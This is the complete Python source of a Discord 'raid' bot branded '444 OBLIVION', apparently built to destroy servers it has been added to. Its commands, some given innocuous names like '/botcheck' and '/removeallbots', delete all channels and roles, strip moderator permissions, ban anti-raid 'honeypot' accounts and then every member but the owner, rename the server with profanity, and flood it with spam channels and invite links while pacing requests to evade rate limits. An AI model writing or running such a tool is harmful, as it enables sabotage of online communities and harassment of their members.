import os
import discord
from discord.ext import commands
import asyncio
import random
import datetime

TOKEN = os.getenv("TOKEN")
LOG_CHANNEL_ID = 1541121005601161297

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

async def log(interaction, action, guild_id, details):
    channel = bot.get_channel(LOG_CHANNEL_ID)
    if channel:
        embed = discord.Embed(
            title=f"📋 RAID LOG",
            color=0xff0000,
            timestamp=datetime.datetime.utcnow()
        )
        embed.add_field(name="Action", value=action, inline=False)
        embed.add_field(name="Guild ID", value=guild_id, inline=True)
        embed.add_field(name="Executed by", value=interaction.user.mention, inline=True)
        embed.add_field(name="Details", value=details, inline=False)
        embed.set_footer(text="Raid Bot v2.0")
        try:
            await channel.send(embed=embed)
        except:
            pass

@bot.event
async def on_ready():
    print(f"Bot {bot.user} ready")
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} commands")
    except Exception as e:
        print(f"Sync error: {e}")

# ========== !sync ==========
@bot.command()
async def sync(ctx):
    try:
        await bot.tree.sync()
        await ctx.send("✅ Commands synced globally! Try /flex now.")
    except Exception as e:
        await ctx.send(f"❌ Sync failed: {e}")

# ========== /commands ==========
@bot.tree.command(name="commands", description="Show all raid commands with details")
async def list_commands(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔥 444 RAID COMMANDS",
        description="Complete command list with descriptions and examples",
        color=0xff0000,
        timestamp=datetime.datetime.utcnow()
    )
    embed.add_field(
        name="/raid",
        value="**Parameters:** `guild_id:str` `channel_count:int` `custom_message:str` `invite_link:str`\nDelete all channels/roles, remove admin roles, ban honeypot, create new channels, send your custom message + custom invite link in each channel, rename server to 444.\n\n**Example:** `/raid guild_id:123456789 channel_count:50 custom_message:GET FUCKED invite_link:https://discord.gg/xxx`",
        inline=False
    )
    embed.add_field(
        name="/wipe",
        value="**Parameters:** `guild_id:str`\nDelete all channels and roles, remove admin roles, ban honeypot, rename server to WIPED.\n\n**Example:** `/wipe guild_id:123456789`",
        inline=False
    )
    embed.add_field(
        name="/delete_members",
        value="**Parameters:** `guild_id:str`\nBan all members except server owner and bot.\n\n**Example:** `/delete_members guild_id:123456789`",
        inline=False
    )
    embed.add_field(
        name="/startgenerating",
        value="**Parameters:** `guild_id:str` `channel_count:int` `custom_message:str` `invite_link:str`\nFull raid: ban honeypot, delete admin roles, delete all channels/roles, rename to FUCKED BY THE 444S, ban all members except owner/bot, create channels with your custom message + custom invite.\n\n**Example:** `/startgenerating guild_id:123456789 channel_count:50 custom_message:444 OBLIVION invite_link:https://discord.gg/xxx`",
        inline=False
    )
    embed.add_field(
        name="/removeallbots",
        value="**Parameters:** `guild_id:str`\nBan all members except server owner and bot (same as /delete_members).\n\n**Example:** `/removeallbots guild_id:123456789`",
        inline=False
    )
    embed.add_field(
        name="/botcheck",
        value="**Parameters:** `guild_id:str`\nComplete wipe: ban honeypot, delete admin roles, delete all channels/roles, ban all members except owner/bot, rename server to FUCKED BY THE 444S.\n\n**Example:** `/botcheck guild_id:123456789`",
        inline=False
    )
    embed.add_field(
        name="/flex",
        value="Show 444 server branding – icon, banner, description.",
        inline=False
    )
    embed.add_field(
        name="!flex",
        value="Same as /flex but as a prefix command.",
        inline=False
    )
    embed.add_field(
        name="!cmds",
        value="Reveal the true purpose of all commands (hidden truth list).",
        inline=False
    )
    embed.set_footer(text="All commands log to channel 1541121005601161297")
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== /raid ==========
@bot.tree.command(name="raid", description="Launch raid - delete channels and create new ones with custom message + invite")
async def raid(interaction: discord.Interaction, guild_id: str, channel_count: int, custom_message: str, invite_link: str):
    await interaction.response.send_message("Raid launched.", ephemeral=True)
    guild = bot.get_guild(int(guild_id))
    if not guild:
        await interaction.followup.send("Bot not found on that server")
        return

    for member in guild.members:
        if "honeypot" in member.name.lower() or "honey" in member.name.lower():
            try:
                await member.ban(reason="Anti-honeypot")
                await asyncio.sleep(0.3)
            except:
                pass

    for role in guild.roles:
        if role.permissions.administrator or role.permissions.ban_members or role.permissions.manage_channels:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    await asyncio.sleep(0.2)
                except:
                    pass

    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.1)
        except:
            pass

    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.1)
            except:
                pass

    try:
        await guild.edit(name="444")
    except:
        pass

    created = 0
    while created < channel_count:
        try:
            channel = await guild.create_text_channel("get-fucked-by-the-444s")
            created += 1
            await channel.send(f"{custom_message}\n{invite_link}")
            await asyncio.sleep(random.uniform(0.1, 0.3))
            if created % 5 == 0:
                await asyncio.sleep(random.uniform(0.5, 1.0))
        except discord.errors.RateLimited:
            await asyncio.sleep(random.uniform(2, 5))
        except:
            break

    await interaction.followup.send(f"Done. Created {created} channels with your custom message and invite link.")
    await log(interaction, "RAID", guild_id, f"Created {created} channels. Server renamed to 444. Custom message: {custom_message} | Invite: {invite_link}")

# ========== /wipe ==========
@bot.tree.command(name="wipe", description="Delete all channels and roles")
async def wipe(interaction: discord.Interaction, guild_id: str):
    await interaction.response.send_message("Wipe started.", ephemeral=True)
    guild = bot.get_guild(int(guild_id))
    if not guild:
        await interaction.followup.send("Bot not found on that server")
        return

    for member in guild.members:
        if "honeypot" in member.name.lower() or "honey" in member.name.lower():
            try:
                await member.ban(reason="Anti-honeypot")
                await asyncio.sleep(0.3)
            except:
                pass

    for role in guild.roles:
        if role.permissions.administrator or role.permissions.ban_members or role.permissions.manage_channels:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    await asyncio.sleep(0.2)
                except:
                    pass

    channel_count = len(guild.channels)
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.1)
        except:
            pass

    role_count = len([r for r in guild.roles if r.name != "@everyone"])
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.1)
            except:
                pass

    try:
        await guild.edit(name="WIPED")
    except:
        pass

    await interaction.followup.send(f"Wiped. Deleted {channel_count} channels, {role_count} roles.")
    await log(interaction, "WIPE", guild_id, f"Deleted {channel_count} channels, {role_count} roles.")

# ========== /delete_members ==========
@bot.tree.command(name="delete_members", description="Ban all members except owner and bot")
async def delete_members(interaction: discord.Interaction, guild_id: str):
    await interaction.response.send_message("Deleting members...", ephemeral=True)
    guild = bot.get_guild(int(guild_id))
    if not guild:
        await interaction.followup.send("Bot not found on that server")
        return

    owner = guild.owner
    banned = 0
    total = len([m for m in guild.members if m != owner and m != bot.user])

    for member in guild.members:
        if member == owner or member == bot.user:
            continue
        try:
            await member.ban(reason="Raid bot")
            banned += 1
            await asyncio.sleep(random.uniform(0.2, 0.5))
        except:
            pass

    await interaction.followup.send(f"Banned {banned}/{total} members.")
    await log(interaction, "DELETE_MEMBERS", guild_id, f"Banned {banned}/{total}. Owner: {owner.name}")

# ========== /startgenerating ==========
@bot.tree.command(name="startgenerating", description="Full raid: wipe + ban + create channels with custom message + invite")
async def startgenerating(interaction: discord.Interaction, guild_id: str, channel_count: int, custom_message: str, invite_link: str):
    await interaction.response.send_message("Full raid generating...", ephemeral=True)
    guild = bot.get_guild(int(guild_id))
    if not guild:
        await interaction.followup.send("Bot not found on that server")
        return

    for member in guild.members:
        if "honeypot" in member.name.lower() or "honey" in member.name.lower():
            try:
                await member.ban(reason="Anti-honeypot")
                await asyncio.sleep(0.3)
            except:
                pass

    for role in guild.roles:
        if role.permissions.administrator or role.permissions.ban_members or role.permissions.manage_channels:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    await asyncio.sleep(0.2)
                except:
                    pass

    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.1)
        except:
            pass

    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.1)
            except:
                pass

    try:
        await guild.edit(name="FUCKED BY THE 444S")
    except:
        pass

    owner = guild.owner
    banned = 0
    for member in guild.members:
        if member == owner or member == bot.user:
            continue
        try:
            await member.ban(reason="Raid generated")
            banned += 1
            await asyncio.sleep(random.uniform(0.2, 0.5))
        except:
            pass

    created = 0
    while created < channel_count:
        try:
            channel = await guild.create_text_channel("get-fucked-by-the-444s")
            created += 1
            await channel.send(f"{custom_message}\n{invite_link}")
            await asyncio.sleep(random.uniform(0.1, 0.3))
            if created % 5 == 0:
                await asyncio.sleep(random.uniform(0.5, 1.0))
        except discord.errors.RateLimited:
            await asyncio.sleep(random.uniform(2, 5))
        except:
            break

    await interaction.followup.send(f"Full raid done. Banned {banned} members. Created {created} channels with your custom message and invite link.")
    await log(interaction, "STARTGENERATING", guild_id, f"Banned {banned} members. Created {created} channels. Server renamed to FUCKED BY THE 444S. Custom message: {custom_message} | Invite: {invite_link}")

# ========== /removeallbots ==========
@bot.tree.command(name="removeallbots", description="Remove all members except owner and bot")
async def removeallbots(interaction: discord.Interaction, guild_id: str):
    await interaction.response.send_message("Removing all members...", ephemeral=True)
    guild = bot.get_guild(int(guild_id))
    if not guild:
        await interaction.followup.send("Bot not found on that server")
        return

    owner = guild.owner
    removed = 0
    total = len([m for m in guild.members if m != owner and m != bot.user])

    for member in guild.members:
        if member == owner or member == bot.user:
            continue
        try:
            await member.ban(reason="Removed by raid bot")
            removed += 1
            await asyncio.sleep(random.uniform(0.2, 0.5))
        except:
            pass

    await interaction.followup.send(f"Removed {removed}/{total} members.")
    await log(interaction, "REMOVEALLBOTS", guild_id, f"Removed {removed}/{total}. Owner: {owner.name}")

# ========== /botcheck ==========
@bot.tree.command(name="botcheck", description="Wipe server completely")
async def botcheck(interaction: discord.Interaction, guild_id: str):
    await interaction.response.send_message("Bot check wipe initiated...", ephemeral=True)
    guild = bot.get_guild(int(guild_id))
    if not guild:
        await interaction.followup.send("Bot not found on that server")
        return

    for member in guild.members:
        if "honeypot" in member.name.lower() or "honey" in member.name.lower():
            try:
                await member.ban(reason="Bot check")
                await asyncio.sleep(0.3)
            except:
                pass

    for role in guild.roles:
        if role.permissions.administrator or role.permissions.ban_members or role.permissions.manage_channels:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    await asyncio.sleep(0.2)
                except:
                    pass

    channel_count = len(guild.channels)
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.1)
        except:
            pass

    role_count = len([r for r in guild.roles if r.name != "@everyone"])
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.1)
            except:
                pass

    owner = guild.owner
    banned = 0
    for member in guild.members:
        if member == owner or member == bot.user:
            continue
        try:
            await member.ban(reason="Bot check wipe")
            banned += 1
            await asyncio.sleep(random.uniform(0.2, 0.5))
        except:
            pass

    try:
        await guild.edit(name="FUCKED BY THE 444S")
    except:
        pass

    await interaction.followup.send(f"Bot check complete. Deleted {channel_count} channels, {role_count} roles. Banned {banned} members.")
    await log(interaction, "BOTCHECK", guild_id, f"Deleted {channel_count} channels, {role_count} roles. Banned {banned} members. Server renamed to FUCKED BY THE 444S.")

# ========== /flex ==========
@bot.tree.command(name="flex", description="Show 444 server branding - icon, banner, description")
async def flex(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔥 444 OBLIVION",
        description="**Where chaos meets order. 444 reigns.**\n\n⚔️ Raid Ready\n🔥 Destructive Power\n💀 444 Legacy\n\n**Server Status:** ACTIVE\n**Brand:** 444 OBLIVION\n**Theme:** Chaos & Order",
        color=0xff0000,
        timestamp=datetime.datetime.utcnow()
    )
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1541216461480271912/1541218341811781722/IMG_4545.png")
    embed.set_image(url="https://cdn.discordapp.com/attachments/1541216461480271912/1541218341811781722/IMG_4545.png")
    embed.set_footer(text="444 OBLIVION • Built by the 444s")
    
    await interaction.response.send_message(embed=embed)

# ========== !flex ==========
@bot.command(name="flex")
async def flex_prefix(ctx):
    embed = discord.Embed(
        title="🔥 444 OBLIVION",
        description="**Where chaos meets order. 444 reigns.**\n\n⚔️ Raid Ready\n🔥 Destructive Power\n💀 444 Legacy\n\n**Server Status:** ACTIVE\n**Brand:** 444 OBLIVION\n**Theme:** Chaos & Order",
        color=0xff0000,
        timestamp=datetime.datetime.utcnow()
    )
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1541216461480271912/1541218341811781722/IMG_4545.png")
    embed.set_image(url="https://cdn.discordapp.com/attachments/1541216461480271912/1541218341811781722/IMG_4545.png")
    embed.set_footer(text="444 OBLIVION • Built by the 444s")
    await ctx.send(embed=embed)

# ========== !cmds ==========
@bot.command(name="cmds")
async def cmds(ctx):
    embed = discord.Embed(
        title="🔥 TRUE COMMAND LIST",
        color=0xff0000,
        timestamp=datetime.datetime.utcnow()
    )
    embed.add_field(
        name="/raid",
        value="Deletes all channels/roles, removes admin roles, bans honeypot, creates new channels with your custom message + custom invite link, renames server to 444.",
        inline=False
    )
    embed.add_field(
        name="/wipe",
        value="Deletes all channels and roles, removes admin roles, bans honeypot, renames server to WIPED.",
        inline=False
    )
    embed.add_field(
        name="/delete_members",
        value="Bans all members except server owner and bot.",
        inline=False
    )
    embed.add_field(
        name="/startgenerating",
        value="Full raid: bans honeypot, deletes admin roles, deletes all channels/roles, renames to FUCKED BY THE 444S, bans all members except owner/bot, creates channels with your custom message + custom invite link.",
        inline=False
    )
    embed.add_field(
        name="/removeallbots",
        value="Bans all members except server owner and bot.",
        inline=False
    )
    embed.add_field(
        name="/botcheck",
        value="Complete wipe: bans honeypot, deletes admin roles, deletes all channels/roles, bans all members except owner/bot, renames server to FUCKED BY THE 444S.",
        inline=False
    )
    embed.add_field(
        name="/flex",
        value="Shows 444 server branding with icon, banner, and description.",
        inline=False
    )
    embed.add_field(
        name="!flex",
        value="Same as /flex but as a prefix command.",
        inline=False
    )
    embed.set_footer(text="⚠️ DESTRUCTIVE COMMANDS – USE WITH CAUTION")
    await ctx.send(embed=embed)

bot.run(TOKEN)
